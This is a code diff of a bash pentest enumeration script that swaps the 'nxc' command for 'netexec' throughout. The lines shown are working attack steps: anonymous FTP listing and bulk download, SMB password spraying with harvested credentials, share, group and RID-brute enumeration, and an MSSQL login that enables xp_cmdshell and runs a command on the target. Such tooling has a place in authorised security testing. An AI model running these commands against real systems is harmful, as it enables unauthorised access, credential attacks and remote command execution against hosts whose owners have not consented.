@@ -126,7 +126,7 @@ for port in $open_ports; do
             ;;
         21)
             # https://www.netexec.wiki/ftp-protocol/file-listing-etc
-            nxc ftp "$target" -u 'anonymous' -p 'anonymous' --ls
+            netexec ftp "$target" -u 'anonymous' -p 'anonymous' --ls
             mkdir -p "$enumx_dir"/ftp
             for x in $(curl -s -u anonymous:anonymous -l ftp://"$target" 2>/dev/null)
             do curl -s -u anonymous:anonymous -o "$enumx_dir/ftp/$x" ftp://"$target/$x" 2>/dev/null
@@ -217,14 +217,14 @@ for port in $open_ports; do
             echo "Enumerating port $port can take some time please wait..."
             mkdir -p "$enumx_dir"/smb 2>/dev/null
           	if [ "$using_creds" == true ]; then
-          		spray=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
+          		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
           		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
   		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
 	           	while IFS= read -r cred; do
 	           		read credu credp <<< $(echo "$cred" | sed 's/:/ /')
-   		            shares=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --shares)
-   		            groups=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --groups)
-   		            ridbrute=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute 10000)
+   		            shares=$(netexec smb "$target" --port "$port" -u "$credu" -p "$credp" --shares)
+   		            groups=$(netexec smb "$target" --port "$port" -u "$credu" -p "$credp" --groups)
+   		            ridbrute=$(netexec smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute 10000)
                     echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"
                     sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
  	            	echo "$shares" | awk '{print $5,$6,$7,$8,$9,$10}' | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | sed 's/^[ \t]*//;s/[ \t]*$//' | tee -a "$enumx_dir/shares"
@@ -234,7 +234,7 @@ for port in $open_ports; do
  	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
  	                sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
  	                if [ -n "$credp" ]; then
-	                    echo "Using nxc modules as $credu:$credp on $target..."
+	                    echo "Using netexec modules as $credu:$credp on $target..."
 	 	                while IFS= read -r module; do
 	 	                    netexec smb "$target" --port "$port" -u "$credu" -p "$credp" -M "$module" | grep -viE '[*]'
 	 	                   echo
@@ -251,9 +251,9 @@ for port in $open_ports; do
                 default_usernames=("guest" "")
                 for user in "${default_usernames[@]}"
                 do
-                shares=$(nxc smb "$target" --port "$port" -u "$user" -p '' --shares)
-                groups=$(nxc smb "$target" --port "$port" -u "$user" -p '' --groups)
-                ridbrute=$(nxc smb "$target" --port "$port" -u "$user" -p '' --rid-brute)
+                shares=$(netexec smb "$target" --port "$port" -u "$user" -p '' --shares)
+                groups=$(netexec smb "$target" --port "$port" -u "$user" -p '' --groups)
+                ridbrute=$(netexec smb "$target" --port "$port" -u "$user" -p '' --rid-brute)
                 list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
                 echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]'
                 echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]'
@@ -307,14 +307,14 @@ for port in $open_ports; do
             echo "Enumerating port $port can take some time please wait..."
             mkdir -p "$enumx_dir"/smb 2>/dev/null
           	if [ "$using_creds" == true ]; then
-          		spray=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
+          		spray=$(netexec smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
           		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
   		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
 	           	while IFS= read -r cred; do
 	           		read credu credp <<< $(echo "$cred" | sed 's/:/ /')
-   		            shares=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --shares)
-   		            groups=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --groups)
-   		            ridbrute=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute 10000)
+   		            shares=$(netexec smb "$target" --port "$port" -u "$credu" -p "$credp" --shares)
+   		            groups=$(netexec smb "$target" --port "$port" -u "$credu" -p "$credp" --groups)
+   		            ridbrute=$(netexec smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute 10000)
                     echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"
                     sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
  	            	echo "$shares" | awk '{print $5,$6,$7,$8,$9,$10}' | grep -iE 'READ|WRITE' | sed -E 's/(.*) (READ|WRITE).*/\1/' | sed 's/^[ \t]*//;s/[ \t]*$//' | tee -a "$enumx_dir/shares"
@@ -324,7 +324,7 @@ for port in $open_ports; do
  	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
  	                sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
  	                if [ -n "$credp" ]; then
-	                    echo "Using nxc modules as $credu:$credp on $target..."
+	                    echo "Using netexec modules as $credu:$credp on $target..."
 	 	                while IFS= read -r module; do
 	 	                    netexec smb "$target" --port "$port" -u "$credu" -p "$credp" -M "$module" | grep -viE '[*]'
 	 	                   echo
@@ -341,9 +341,9 @@ for port in $open_ports; do
                 default_usernames=("guest" "")
                 for user in "${default_usernames[@]}"
                 do
-                shares=$(nxc smb "$target" --port "$port" -u "$user" -p '' --shares)
-                groups=$(nxc smb "$target" --port "$port" -u "$user" -p '' --groups)
-                ridbrute=$(nxc smb "$target" --port "$port" -u "$user" -p '' --rid-brute)
+                shares=$(netexec smb "$target" --port "$port" -u "$user" -p '' --shares)
+                groups=$(netexec smb "$target" --port "$port" -u "$user" -p '' --groups)
+                ridbrute=$(netexec smb "$target" --port "$port" -u "$user" -p '' --rid-brute)
                 list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
                 echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]'
                 echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]'
@@ -400,8 +400,8 @@ for port in $open_ports; do
             ;;
         1433)
             # https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
-            nxc mssql "$target" -u 'anonymous' -p 'anonymous' -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
-            nxc mssql "$target" -u 'anonymous' -p 'anonymous' -x "whoami"
+            netexec mssql "$target" -u 'anonymous' -p 'anonymous' -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+            netexec mssql "$target" -u 'anonymous' -p 'anonymous' -x "whoami"
             ;;
         1521)
             # https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
